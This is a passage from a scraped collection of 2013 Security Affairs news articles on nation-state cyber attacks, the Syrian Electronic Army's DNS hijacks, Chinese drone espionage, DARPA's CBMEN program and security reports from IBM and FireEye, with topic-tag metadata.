state-sponsored hackers, it\u2019s crucial for the Israeli government

that identifies Social media as the main target of cyber criminal activities. The powerful social networking platforms allow cyber criminals to reach a wide audience unaware of ongoing menaces, at risk are not only consumers but also private companies that use social media for their business.\n\nThe X-Force 2013 Mid-Year Trend and Risk Report remarked a growing trend recently emerged in takeover of social media profiles that have a large number of followers. Attackers are intensifying their effort against very popular accounts that could be used for further attacks. Compromising accounts with a large number of followers gives to the attackers the possibility  to reach a wide audience with malicious content.\n\n\u201cSocial media has become a new playground for attackers,\u201d \u201cIt\u2019s one thing to get an email or spam from someone you\u2019ve never heard of,\u201d  \u201cIt\u2019s another thing to have one of your friends have their account compromised and send you a link that might interest you. declared Kevin Skapinetz, program director for product strategy for IBM Security Systems.\n\nDo you want an example?\n\nIn recent weeks a cyber-attack on Facebook hit Alpitour, one of the most important Italian companies operating in the tourism sector. Hackers have breached the credentials of the social media profile managers: the cyber-criminals published false promotional offers to intercept user\u2019s data bank credentials and personal information.  According to experts, the action is the work of foreign hackers.\n\nIBM X-Force 2013 Mid-Year Trend and Risk Report also highlights the critical increase of mobile threats, the number of attacks that hit mobile users is literally exploded in the last months as confirmed by principal security firms, also in this case most concerning news are related to the business use of mobile handset that enlarge the attack surface for private companies.\n\n\n\nMobile suffers exactly same attacks of desktop machines with a complication related to the mobility of devices that expose them to further risks.\n\n\u201cMany of the vulnerabilities affecting mobile platforms originate in components that are used in both mobile and desktop software. The remaining vulnerabilities are specific to mobile applications and represent a large portion of the increase in disclosures seen in 2012 and 2013\u201d\n\nCyber attacks are becoming even more frequent and sophisticated, in various cases they exploited zero day vulnerabilities, unknown vulnerabilities are the principal prerogative of state-sponsored attacks conducted for cyber espionage purpose. Hackers search for sensitive information, almost related to advanced technologies in critical industries, the risk related to intellectual property theft is dramatically increased.\n\n\u201cWatering hole attacks, which have continued, are a great example of how operational sophistication is being used to reach targets not previously susceptible. This type of campaign involves a form of targeted attack in which the attacker identifies a website that a select group is known to visit. By compromising the central site and using it to serve malware, attackers are able to reach more technically savvy victims who may not be fooled in phishing attempts, but who do not suspect that the sites they trust could be malicious. Several high tech companies, as well as government agencies have been successfully breached in past months.\u201d\n\nWhich are the principal flaws exploited by hackers?\n\nNo doubts, principal problems come from not updated application, Java and Adobe technologies are most targeted by cyber criminals due their diffusion, but attackers also benefit of the lack of security for the the design in web applications. Majority of web applications continues to be vulnerable to basic SQL injection or cross-site scripting attacks, despite the high level of awareness on these categories of menaces.\n\n\n\n \n\n\u201cMany of the breaches reported in the last year were a result of poorly applied security fundamentals and policies and could have been mitigated by putting some basic security hygiene into practice,\u201d \u201cAttackers seem to be capitalizing on this \u2018lack of security basics\u2019 by using a model of operational sophistication that allows them to increase their return on exploit,\u201d states the report.\n\nAnother element of great concern in the cyber security landscape is the availability of exploit kits to use in automated attacks, thanks to the offer in the underground, cyber criminal activities are significantly advantaged, arrange an attack has never been so easy.\n\nThe X-Force 2013 Mid-Year Trend and Risk Report  proposes many other interesting data including information on Web trends, spam, and phishing, targeted attacks and data breaches.\n\nThe study ends with useful indications on best practices for mitigation of principal cyber threats, the document provides guidelines to address vulnerabilities reducing the attack surface.\n\nOnly by knowing your enemy you can fight it!\n\nPierluigi Paganini\n\n(Security Affairs \u2013  IBM, X-Force 2013 Mid-Year Trend and Risk Report, cybersecurity)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ibm", "topic_name": "IBM"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mobile", "topic_name": "mobile"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/phishing", "topic_name": "phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-2", "topic_name": "security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-media", "topic_name": "social media"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spam", "topic_name": "spam"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-attacks", "topic_name": "state-sponsored attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/targeted-attacks", "topic_name": "targeted attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/watering-hole", "topic_name": "watering hole"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/x-force-2013-mid-year-trend-and-risk-report", "topic_name": "X-Force 2013 Mid-Year Trend and Risk Report"}]}, {"news_name": "FireEye World War C report \u2013 Nation-state driven cyber attacks", "news_link": "https://securityaffairs.co/wordpress/18294/security/fireeye-nation-state-driven-cyber-attacks.html", "title": "FireEye World War C report \u2013 Nation-state driven cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 3, 2013", "body": "Nation-state driven cyber attacks are routinely conducted on a global scale to defend national sovereignty and project national power. We are living in the cyber era, human conflict is involving also the fifth domain of warfare, the cyberspace. As never before disputes take place with blows of bits, militias of every government are developing cyber capabilities dedicating great effort for the establishment of cyber units.\n\nSecurity firm FireEye published another interesting research titled \u201cWorld War C\u201d that describes the effort spent by governments in cyber warfare context, the document analyzes in detail the different approaches adopted by various countries in conducting nation-state driven cyber attacks. Security experts highlight the intensification of state-sponsored attacks for both cyber espionage and sabotage purpose, campaigns such as Moonlight Maze and Titan Rain or the destructive cyber strikes on Iran and Georgia have signed the evolution of the military doctrine.\n\n\u201cCyberspace has become a full-blown war zone as governments across the globe clash for digital supremacy in a new, mostly invisible theater of operations. Once limited to opportunistic criminals, cyber attacks are becoming a key weapon for governments seeking to defend national sovereignty and project national power.\u201d\n\nIn the arsenal of government militias are entering strongly DDoS tools, spyware and computer viruses, nation-state driven cyber attacks are considerable an optimal option by governments for the following reasons:\n\nAs explained in the study the attribution of responsibility for a cyber attack is a very hard task, FireEye experts correctly highlighted that to uncover the perpetrators is necessary to apply a multi layered approach based on forensic \u201creverse-hacking\u201d techniques, build a deep knowledge of \u201cpatterns\u201d of attack, evaluate the geopolitical context of cyber attacks aims associated to specific government.\n\n\u201cA cyber attack, viewed outside of its geopolitical context, allows very little legal maneuvering room for the defending state,\u201d \u201cFalse flag operations and the very nature of the internet makes tactical attribution a losing game. However, strategic attribution \u2013 fusing all sources of intelligence on a potential threat \u2013 allows a much higher level of confidence and more options for the decision maker,\u201d \u201cAnd strategic attribution begins and ends with geopolitical analysis.\u201d said Professor Thomas Wingfield of the Marshall Centre, a joint US-German defense studies institute.\n\n\u201cThe biggest challenge to deterring, defending against, or retaliating for cyber attacks is the problem of correctly identifying the perpetrator,\u201d said Prof. John Arquilla, Naval Postgraduate School\n\n\u201cAttribution\u201d for a nation-state driven cyber attack  is difficult due to similarity with methods adopted by single individuals, organizations, or state-sponsored hackers. States are often mistakenly identified as non-state entities, and vice versa. Another dangerous phenomenon that we are assisting is the growth of number of cyber mercenary groups close to governments that are structured as cyber criminal gangs but that are able to offer hacking services to involve in nation-state driven cyber attacks.\n\n\u201ccybercrime organizations offer anyone, including governments, cyber attack services to include denial-of-service attacks and access to previously compromised networks.\u201d states the World War C report.\n\nFireEye experts analyzed the Nation-state driven cyber attacks identifying the tactics and characteristics for the offensive in various regions:\n\nNew players are entering the arena of cyber warfare strongly, countries such a North Korea, Iran and Syria have demonstrated to represent a serious menace also for the most industrialized super power, this is the democracy of the new military doctrine. Examining most advanced countries  in cyber warfare, China is considered responsible for the largest number of Nation-state driven cyber attacks, it uses high-volume noisly cyber attacks mainly for cyberespionage.\n\nOn the other end U.S., and Israel, providing the most advanced technologies, are able to conduct more sophisticated and surgical cyber operations, Stuxnet and Duqu are just a couple of examples of products of joint effort spent by the two governments. The Russian Government is considered one of the entities with major cyber capabilities, like Israel and US it is able to perform sophisticated nation-state driven cyber attacks, but little is known about the internal organization of its cyber units. According to rumors, a group of hackers that report directly to the President is the core of Russian cyber command that has operated in stealthily way in cyberspace against hostile governments and on the domestic front against opponents of the regime.\n\n\u201cThough relatively quiet, Russia appears to be home to many of the most complex and advanced cyber attacks FireEye researchers have seen. More specifically, Russian exploit code can be significantly stealthier than its Chinese counterpart\u2014which can also make it more worrisome. The \u201cRed October\u201d campaign, including its satellite software dubbed \u201cSputnik,\u201d is a prominent example of likely Russian malware.\u201d states the report\n\nFireEye\u2019s World War C ends proposing a list of factors that could influence the cyber security landscape in the medium term:\n\n\n\nInformation warfare is ongoing \u2026\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Nation-state driven cyber attacks,  cyberwarfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-mercenary", "topic_name": "cyber mercenary"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberespionge", "topic_name": "cyberespionge"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fireeye", "topic_name": "FireEye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nation-state-driven-cyber-attacks", "topic_name": "Nation-state driven cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/red-october", "topic_name": "Red October"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/world-war-c", "topic_name": "World War C"}]}, {"news_name": "Iran hacked US Navy Computers", "news_link": "https://securityaffairs.co/wordpress/18171/hacking/iran-hacked-us-navy-computers.html", "title": "Iran hacked US Navy Computers\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 29, 2013", "body": "The Wall Street Journal reported that Iran hacked unclassified US Navy computers, the allegations were made by US officials that consider the attacks of most serious intrusion within Government Network made by foreign states.\n\n\u201cThe U.S. officials said the attacks were carried out by hackers working for Iran\u2019s government or by a group acting with the approval of Iranian leaders. The most recent incident came in the week starting Sept. 15, before a security upgrade, the officials said. Iranian officials didn\u2019t respond to requests to comment.\u201d\n\nUS officials sustained that Iranian hackers working for the government of Teheran have repeatedly violated computer systems within an unclassified Navy computer network for cyber espionage purpose.\n\nDespite no sensitive information has been leaked the event is considered very concerning for US Intelligence, similar attacks could expose confidential information such as blueprints of a new cyber weapon, but could also compromise an architecture of the Defense.\n\nIran\u2019s cyber abilities have increased gradually reaching a concerning level, Teheran has sufficient cyber abilities to attack the US causing serious damages to the critical infrastructures of the country. Iranian state sponsored hackers could hit critical infrastructure using malicious code and tools free available on the internet and purchased in the underground.\n\nThe study \u201cIran: How a Third Tier Cyber Power Can Still Threaten the United States\u201d, published by the Atlantic Council sustains that despite the Iranian cyber capabilities are considered modest, they could be sufficient to launch attacks against the U.S.that would do more damage to public perceptions than actual infrastructure.\n\n\u201cTheir ability to also play in this [cyber] sandbox compounds that concern,\u201d a US official said.\n\nUS officials added that Congress has been briefed on the attack, Defense Secretary Chuck Hagel and Chairman of the Joint Chiefs of Staff Gen.

A department spokesman said its networks are attacked daily. \u201cWe take these attempts seriously and work to learn lessons from every one of them,\u201d the spokesman said.\n\n \n\n\n\n\u201cThe series of Iranian intrusions revealed a weakness in the Navy network and a shortcoming in the service\u2019s defenses compared with other unclassified military networks, according to U.S. officials.\n\nOnce the intruders got into the Navy computer system, they were able to exploit security weaknesses to penetrate more deeply into the unclassified network, the officials said.\u201d\n\nIranian state-sponsored hackers already hit US in the past, the US major banks were hit by a series of powerful DDoS attacks and energy industry computer networks were hacked, but if the event is confirmed there is the concrete risk that the cyber conflict may escalate.\n\nBetween US and Iran there is a dangerous tension that has repercussions in the cyber space while US President Barack Obama and Iranian President Hassan Rouhani are trying to define a diplomatic conduct to reach an agreement on the development of Iranian nuclear program. The two leaders spoke on Friday, from the White House Friday afternoon, Obama announced he just got off the phone with Iranian President Hassan Rouhani and discussed \u201cour ongoing efforts to reach an agreement over Iran\u2019s nuclear program.\u201d \n\n\u201cI believe we can reach a comprehensive solution,\u201d Obama said, adding that he has asked US Secretary of State John Kerry to continue pursuing a deal with Iran that would prohibit Tehran from pursuing the development of nuclear weapons.\n\n\u201cI do believe that there is a basis for a resolution,\u201d Obama said.\n\n\u201cRouhani has indicated that Iran will never develop nuclear weapons,\u201d Obama said, hailing that sentiment as a \u201cmajor step forward in a new relationship between the United States and the Islamic Republican of Iran.\u201d\n\nThe cyber war between US and Iran started a long ago, one of most debated event is the sabotage of Iranian uranium enrichment facilities made with cyber weapon known as Stuxnet.\n\nCybersecurity experts are not concerned only by Iran, most dangerous players in the cyberspace like China and Russia that have more sophisticated hacking capabilities than Iran.\n\nThe conflict between US and Iran is ongoing in the cyberspace and could have serious repercussions on the diplomatic dialogue established between the two governments, a cyber attack could have the same effect of a conventional strike \u2026 this could be just the beginning.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Iran hacked US, Iran, cyber warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "Chinese hackers increasingly attracted to the drone technology", "news_link": "https://securityaffairs.co/wordpress/18023/intelligence/chinese-hackers-on-drone-tech.html", "title": "Chinese hackers increasingly attracted to the drone technology\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 25, 2013", "body": "The fact that Chinese hackers are most persistent collectors for sensitive information is not a mystery, more difficult to demonstrate the direct involvement of the PLA behind the operations of computer experts that systematically seek to unravel the secrets of Western companies and government organizations.\n\nThe technology that seems to be most attractive for Chinese hackers is the one used for the design of sophisticated US military drone. A Taiwan Defense Ministry report stated that as of mid-2011 the Chinese Air Force had availability of more than 280 drones and that the overall Chinese militia have thousands of UAVs.\n\n\u201cThe military significance of China\u2019s move into unmanned systems is alarming,\u201d said a 2012 report by the Defense Science Board.\n\nThreat intelligence company FireEye, that already revealed numerous APT, tracked for almost two years a group of hackers based in Shangai that has undermined principal defense contractor to steal the precious information.\n\n\u201cI believe this is the largest campaign we\u2019ve seen that has been focused on drone technology,\u201d \u201cIt seems to align pretty well with the focus of the Chinese government to build up their own drone technology capabilities.\u201d\n\nThe group of Chinese hackers, named \u201cComment Crew\u201d is an old acquaintance for security experts, many intelligence analysts recognized in how they operate the involvement Chinese cyber units. The Mandiant Intelligence firm collected evidences that link the group of Chinese hackers to the government of Beijing and in particular to the popular Unit 61398 of the People\u2019s Liberation Army.\n\nFireEye security company months ago detailed a cyber espionage campaign, dubbed OpBeeBus, that targeted drone manufactures. The company tracked back the attackers thanks the analysis of addresses for C&C and tools used in the attacks, the principal evidence against Chinese hackers is similarities with past attacks linked to Beijing, the reuse of the command and control infrastructure (C&C) connected to APT attack on RSA\u2019s SecurID token system occurred in 2011.\n\n\n\nAccording FireEye specialists, Chinese Hackers  targeted both large companies, including US military contractors, and medium/small firms  focused on drone technology.\n\nChina\u2019s growth in the last decade has no equal, the need to proceed at the same pace the technological evolution is an obligation and cyber espionage is still one of the main methods used to gain industry secrets, in particular for the military and aerospace sectors. Agencies and American companies, but also Japanese ones, are victims of constant attacks with the intent of acquiring their intellectual property by deception.\n\nThe Chinese government is investing a great effort for the development of drone program, principal Chinese manufactures are conducting a research for production of a new generation of drones. According military analysts the drone models appeared recently are quite identical to the ones produced by foreign manufacturers, the circumstance could be the results of intense cyber espionage conducted over the year.\n\nChina has acquired foreign drone technology and specializes in its reverse engineering, Chinese focused on US models as confirmed by Mr. Xu:\n\n \u201cAmerican U.A.V. technology is very sophisticated,\u201d \u201cWe can only envy their technology. Right now, we\u2019re learning from them.\u201d\n\nDrones are considered an essential weapon in the modern military arsenal, they could be used for reconnaissance or to strike a target.\n\nChina had deployed a surveillance drone, a  BZK-005, over the East China for the first time on September 9th, in the area around the Diaoyu Islands, and Chinese drones are increasingly appearing in the fleets of other nations. The most interesting example is the Wing Loong, or Pterodactyl, the Chinese version of the popular Predator sold to foreign states since 2011.\n\n\n\nChinese drones seem to have the same performance of the American ones, of course they are much cheaper \u2026 The drone market could be the first victim of Chinese espionage.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Operation BeeBus, Chinese hackers, Drone)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt1", "topic_name": "APT1"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/chinese-hackers", "topic_name": "Chinese hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberespionage", "topic_name": "Cyberespionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/drone", "topic_name": "Drone"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fireeye", "topic_name": "FireEye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mandiant", "topic_name": "Mandiant"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/operation-beebus", "topic_name": "Operation Beebus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pla", "topic_name": "PLA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/predator", "topic_name": "Predator"}]}, {"news_name": "CBMEN, DARPA\u2019s peer-to-peer technology for battlefield", "news_link": "https://securityaffairs.co/wordpress/17719/intelligence/cbmen-darpas-peer-peer-technology-battlefield.html", "title": "CBMEN, DARPA\u2019s peer-to-peer technology for battlefield\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 15, 2013", "body": "DARPA is conducting a program codenamed CBMEM (Content-Based Mobile Edge Networking) for sharing of reconnaissance data over local wireless and radio networks of military troops without having to be tethered to a server. The program is already at an advanced stage and the first tests have given encouraging results, recently the agency has executed successfully some tests on the field designed for data sharing on troops on the ground.\n\nThe Defense Advanced Research Projects Agency (DARPA) conducted various researches on the possibility to exploit the peer-to-peer (P2P) networks due their robustness.\n\nA peer-to-peer (P2P) network is decentralized and distributed network architecture in which each node (\u201cpeers\u201d) acts as both consumer and supplier of resources. In peer-to-peer (P2P) networks every task is shared amongst multiple interconnected peers who each make a portion of their resources directly available to other network participants, the principal advantage is that peers do it without the control of a centralized entity.\n\n\u201cDARPA\u2019s Content-Based Mobile Edge Networking (CBMEN) program aims to provide an alternative approach to the top down focus of most military networks, which provide content over a common operating environment from the strategic to tactical level.  \u201d states the official page for the program.\n\nThe concept behind CBMEN is revolutionary for the military, the content sharing is approached at the individual Soldier or Marine level, this means that despite for hostile context where communication infrastructure is not available the individuals can still generate, elaborate  and share critical content on their own. This possibility is considered strategic and represent a meaningful improvement for troops\u2019 mission.\n\nCBMEN technology has another great advantage, the availability of an impressive computing power of used mobile devices, a squad of nine troops could have more than half a terabyte (500 GB) of cloud storage.\n\n\n\nThe CBMEN software broadcasts content to neighboring devices on the network over cellular, Wi-Fi or radio networks, it is able to maintain synchronization with other CBMEN-equipped devices for network organizations in this way every node of cloud could access to shared content without having to take any action.\n\nDARPA\u2019s experts are working to combine mobile ad-hoc networking with a peer-to-peer technology to make available any kind of content across all devices on field. The data in this way will not pass through the Department of Defense\u2019s existing intelligence-sharing network.\n\n\u201cCBMEN may not sound revolutionary, because people take server access for granted when cell towers, fiber-optic connections and 4G/LTE networks are so widely available worldwide,\u201d \u201cBut when that infrastructure is not available, CBMEN technology enables real-time information sharing where it hasn\u2019t been possible before. CBMEN puts secure, private collaboration and cloud storage in your pocket.\u201d said Keith Gremban, DARPA program manager. \n\nAccording military sources the CBMEM technology could be soon adopted for troops in Afghanistan or engaged in other missions, including humanitarian operations. A typical use is in response to natural disasters in which communications infrastructure is down.\n\nThe first phase of field-tested CBMEN was successfully concluded at Fort A.P. Hill, Va., the CBMEN software was loaded on Android smartphones and WiFi connectivity, as well as on Army Rifleman Radios based on the Joint Tactical Radio System standard.\n\n\n\n \n\nRifleman Radios wearable radios that supports simultaneous voice and data transmission. Following the description of tests in field provided by DARPA post:\n\n\u201cThe field tests proved the concept works and highlighted the potential benefits of real-time information sharing. At one point in the testing, two squads on foot patrol came within communication range of each other. One squad had information about a simulated person of interest that the other squad was seeking. The CBMEN software, working in the background on the troops\u2019 mobile devices, automatically transferred the information from the first squad to the other, without the second squad having to ask for it. As the second squad entered a building where the person of interest was, the squad used that information to immediately identify and apprehend its target.\n\nThe testing also identified areas that need further development such as enhancing security and improving efficiency of information exchange, which will be the focus of the next phase of the program. The goal is to reduce the number of transmissions required, which would save power, and to also reduce the bandwidth needed.\u201d\n\nDARPA has started the phase 2 for the CBMEN test program, to prove \u201cimproved war-fighting mission support in a complex joint-content sharing environment\u201d allowing different Armies to share data across multiple types of networks adopting both commercial smartphones and military equipments.\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cbmen", "topic_name": "CBMEN"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-based-mobile-edge-networking", "topic_name": "Content-Based Mobile Edge Networking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/darpa", "topic_name": "DARPA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/military", "topic_name": "military"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/peer-to-peer", "topic_name": "peer-to-peer"}]}, {"news_name": "Syrian Electronic Army hit NYT and Twitter", "news_link": "https://securityaffairs.co/wordpress/17376/hacking/syrian-electronic-army-hit-twitter-nyt.html", "title": "Syrian Electronic Army hit NYT and Twitter\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 29, 2013", "body": "The Syrian Electronic Army once again successful in an attack, to be precise the popular group of hacker this time hacked into Twitter, Huffington Post and NY Times\u2019 registry accounts modifying DNS records and contact details. The attack to a DNS could allow hackers to redirect target domain visitors to any other site, a technique usable to server malware hijacking victim is on compromised website.\n\nThe Syria Electronic Army, is considered the cyber unit of government of Damascus, during the last months they have conducted numerous operation against numerous organization and companies. The operation of the group notorious to be a pro the Syrian president Bashar al-Assad are intensifying  in conjunction with the escalation of the deep political and social crisis which affects the country.\n\n\nJust to mention the latest events early August the group has announced that at least three White House employees personal Gmail accounts were hacked, In July the Syria Electronic Army conducted a series of attacks exposing account details of major Communications Websites such as Truecaller, Tango and Viber.\n\nFollowing the detailed timeline published by FireEye on the attacks:\n\nThe list of victims of the Syrian Electronic Army is very long and included also BBC, the Associated Press, The Financial Times and  the Guardian. Compression for social media accounts could be used to spread fake and disturbing news, the attack against  Associated Press Twitter account disseminated the news of an attack against the White House causing the fall of the stock markets and losses for more than $100 billion dollars. The group is politically motivated and many security experts consider its campaigns as part of PSYOPs campaign directed by the Syrian Regime.  The Syrian Electronic Army first emerged in May 2011, during the first Syrian uprisings, when it conducted various attacks against social media for pro-Assad propaganda.\n\nThe latest  attack against Twitter was announced in the popular social media with a post of the screenshot of the Whois records for Twitter.com domain\n\n\n\n \n\nThe Syrian Electronic Army also provided evidence of the hacked Twitter accounts in a second tweet:\n\n \n\n\n\n \n\nThe hackers of the Syrian Electronic Army also altered the DNS records for the domain twimg.com which Twitter uses to maintain CSS, JS, images and more, this caused problems in displaying avatars for some users. following the statement issued by the company:\n\n\u201cAt 20:49 UTC, our DNS provider experienced an issue in which it appears DNS records for various organizations were modified, including one of Twitter\u2019s domains used for image serving, twimg.com. Viewing of images and photos was sporadically impacted. By 22:29 UTC, the original domain record for twimg.com was restored.  No Twitter user information was affected by this incident.\u201d\n\nThe hackers also hit the NY Times with serious consequences, they redirected homepage visitors, the popular journal confirmed that its website was disrupted in attack by hackers.\n\n[The attack was carried out by a group known as] \u201cthe Syrian Electronic Army, or someone trying very hard to be them.\u201d The group attacked the company\u2019s domain name registrar, Melbourne IT. The Web site first went down after 3 p.m.; once service was restored, the hackers quickly disrupted the site again. Shortly after 6 p.m., we believe that we are on the road to fixing the problem.\u201d said Marc Frons, chief information officer for The New York Times Company.\n\n\n\n \n\nMelbourneIT sent an email to all its customers that indicate that the hackers seems have used a reseller account as part of the hack. The information hasn\u2019t confirmed but it is possible that the hackers exploited a flaw in the reseller interface that allowed a privilege escalation to take over control of other MelbourneIT customers.\n\nThe group of Syrian hackers also hit the HuffingtonPost UK altering its DNS records but as 4pm PST both HuffingtonPost UK\u2019s and Twitter DNS records have been corrected, also Twimg and NY Times records have been fixed.\n\nJust a few minutes ago the group has announced on Twitter and Facebook that its website and domain are down.\n\n \n\n\n\nA possible countermeasure\n\nThe CloudFlare company posted an interesting article on the incident, I desire to extract the suggestion related to a possible countermeasure against this kind of attacks.\n\n\u201cThere is one sensible measure that domains at risk should all put in place immediately. It is possible to put what is known as a registry lock in place for your domain. This prevents even the registrar from making changes to the registry automatically. If you run a whois query against your domain, you can see if you have a registry lock in place if it includes three status lines: serverDeleteProhibited, serverTransferProhibited, and serverUpdateProhibited.\n\nRegistrars generally do not make it easy to request registry locks because they make processes like automatic renewals more difficult. However, if you have a domain that may be at risk, you should insist that your registrar put a registry lock in place.\u201d\n\nThe imminent strike of Syria by US and its allies will have serious repercussion also in the cyberspace ..

Every government is aware of the risks connected to the exposure to a cyber attack for sabotage or cyber espionage, due this reason military all over the world are creating dedicated cyber units to respond to new needs. The reality is that  almost every government is working on the definition of cyber capabilities (e.g. Creation of a new generation of cyber weapons, development of active defense systems) also for offensive purposes, a cyber conflict has numerous advantage respect traditional offensives. A few days ago the Russian Government announced the creation of a dedicated breach for the Information warfare belonging to the Russian Armed Forces, its purpose is to improve cyber capabilities of the country exactly has many other governments are doing. Official military fonts revealed that the agency\u2019s budget for 2013 is 2.3 billion rubles ($70 million).\n\n\u201cCyber space is becoming our priority\u2026the decision to create a cyber-security command and a new branch of the armed forces has already been made,\u201d \u201cWe are working on the overall concept of the program to be developed in this area,\u201d \u201cWe have reviewed 700 innovative projects so far,\u201ddeclared Andrei Grigoryev, the head of the recently-created Foundation for Advanced Military Research, in an interview with Echo Moskvy radio.\n\nThe Foundation for Advanced Military Research is considered the equivalent of US DARPA (Defense Advanced Research Projects Agency) and was set up in 2012 to boost the improvement of Russian cyber capabilities development of advanced weaponry and help streamline the arms procurement process in Russia. According Andrei Grigoryev, the head of the recently-created Foundation for Advanced Military Research, the new unit will be composed by three main areas of military R&D:\n\n\n\nThe Russia isn\u2019t the unique government that announced recently to boost its cyber structures, a few weeks ago was spread the news that the New Zealand Defense Force planned to spend $469 million for the creation of a new cyber army despite the meaningful cut to defense expense of the last years. The investment is considered important by security analysts, consider that today the Australian Army has no surveillance or reconnaissance systems.\n\nIt will be set up a new division under the Network Enabled Army initiative that will be specialized in the development of high technological equipment such as drones and robots as well as sensors that would monitor the location, the health and condition of soldiers and vehicles.\n\n\u201cThe goal of the NEA Programme is to enhance the NZDF\u2019s ability to support deployed land forces by improving its battlefield command and control system, communications and intelligence, surveillance and reconnaissance sensor systems.\u201d\n\nThe Defense Force has invited technology suppliers to a briefing day at its Trentham military base, the Sydney Morning Herald program manager Colonel Phil Collett revealed the spending would be over 20 years.\n\nGovernments are getting ready for a new arms race,  the cyberspace is the new battlefield and cyber weapons are entering in their arsenal near conventional weapons. Stuxnet spread has radically changed the perception of Information warfare, a conflict that is fought in the fifth domain, and that is pushing the producing of weaponized software on an industrial scale. This is considerably an historical moment, Information Warfare is assuming a fundamental importance for any government, leading powers are sustaining the arms race followed by many other countries that may be effective in the same way. We are in a situation similar to the one observed when nuclear weapon will ne used for first time \u2026 every government is trying to improve its cyber capabilities, they cannot be left behind!\n\nCyber weapons can potentially do serious damage to \u201ccritical infrastructures\u201d,  and in many cases weaponized tools are also freely available on the internet, cyber terrorists and state-sponsored hackers could exploit them to hit a government or a private business.

